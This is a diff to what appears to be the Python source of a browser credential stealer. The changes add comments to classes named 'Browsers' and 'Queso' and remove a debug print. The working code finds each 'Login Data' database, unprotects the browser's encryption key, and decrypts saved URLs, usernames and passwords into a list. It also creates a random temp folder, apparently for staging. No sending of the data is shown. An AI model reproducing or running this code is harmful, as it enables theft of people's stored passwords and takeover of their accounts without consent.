@@ -249,39 +249,45 @@ class Browsers:
             
             self.BrowserPath = browser_path
 
-        def GetEncryptionKey(self):
+        def GetEncryptionKey(self): # Get the browser's encryption key
             if self.EncryptionKey is not None:
                 return self.EncryptionKey
             
             else:
+                # Look for local state file
                 local_state_path = os.path.join(self.BrowserPath, "Local State")
                 if os.path.isfile(local_state_path):
                     with open(local_state_path, encoding= "utf-8", errors= "ignore") as local_state_file:
+                        # Load contents to json
                         json_content: dict = json.load(local_state_file)
 
+                    # Decode and unprotect the encryption key
                     encrypted_key: str = json_content["os_crypt"]["encrypted_key"]
                     encrypted_key = base64.b64decode(encrypted_key.encode())[5:]
-
                     self.EncryptionKey = Syscalls.CryptUnprotectData(encrypted_key)
+                    
                     return self.EncryptionKey
                 
                 else:
                     return None
                 
-        def DecryptData(self, buffer: bytes, encryption_key: bytes):
+        def DecryptData(self, buffer: bytes, encryption_key: bytes): # Decrypt data
             encryption_version = buffer.decode(errors= "ignore")
 
+            # Detect encryption version
             if encryption_version.startswith(("v10", "v11")):
+                # Set IV and Data
                 encrypt_iv = buffer[3:15]
                 cipher_data = buffer[15:]
+                # Decrypt using AES256-GCM
                 encryption_cipher = AES.new(encryption_key, AES.MODE_GCM, encrypt_iv)
                 decrypted_data = encryption_cipher.decrypt(cipher_data)[:-16].decode()
-                print(decrypted_data)
                 return decrypted_data
             else:
+                # Decrypt using CryptUnprotectData
                 return str(Syscalls.CryptUnprotectData(buffer))            
             
-        def GetCreds(self):
+        def GetCreds(self): # Get the browser's credentials
             encryption_key = self.GetEncryptionKey()
             password_list = list()
 
@@ -290,30 +296,33 @@ class Browsers:
             
             login_file_paths = list()
 
-            for browser_root, _, browser_files in os.walk(self.BrowserPath):
+            for browser_root, _, browser_files in os.walk(self.BrowserPath): # Find login file paths
                 for browser_file in browser_files:
                     if browser_file.lower() == "login data":
                         file_path = os.path.join(browser_root, browser_file)
                         login_file_paths.append(file_path)
             
             for login_file_path in login_file_paths:
-                while True:
+                while True: # Maintain a temp file
                     tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
                     if not os.path.isfile(tempfile):
                         break
 
-                try:
+                try: # Copy the login file's contents to the temp file
                     shutil.copy(login_file_path, tempfile)
                 except Exception:
                     continue
 
+                # Connect to the temp file with sql
                 password_db = sqlite3.connect(tempfile)
                 password_db.text_factory = lambda encoded_data : encoded_data.decode(errors= "ignore")
                 db_cursor = password_db.cursor()
 
                 try:
+                    # Get the credentials
                     password_results = db_cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()
 
+                    # Decrypt the passwords and add to the password list
                     for pass_url, pass_user, pass_password in password_results:
                         if pass_url and pass_user and pass_password:
                             password_list.append((pass_url, pass_user, self.DecryptData(pass_password, encryption_key)))
@@ -321,6 +330,7 @@ class Browsers:
                 except Exception:
                     pass
 
+                # Close the files
                 db_cursor.close()
                 password_db.close()
                 os.remove(tempfile)
@@ -335,7 +345,7 @@ class Queso:
 
     def __init__(self) -> None:
 
-        while True:
+        while True: # Maintain a temp folder
             self.TempFolder = os.path.join(os.getenv("temp"), Utility.GetRandomString(10, True))
             if not os.path.isdir(self.TempFolder):
                 os.makedirs(self.TempFolder, exist_ok= True)
